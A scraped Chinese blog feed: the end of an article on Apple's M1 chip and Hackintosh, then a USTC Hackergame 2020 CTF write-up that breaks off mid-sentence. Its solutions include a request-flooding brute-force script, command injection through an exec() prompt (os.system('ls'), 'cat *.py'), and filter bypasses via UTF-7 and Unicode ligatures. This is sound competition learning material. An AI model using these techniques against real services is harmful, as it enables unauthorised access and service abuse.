凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 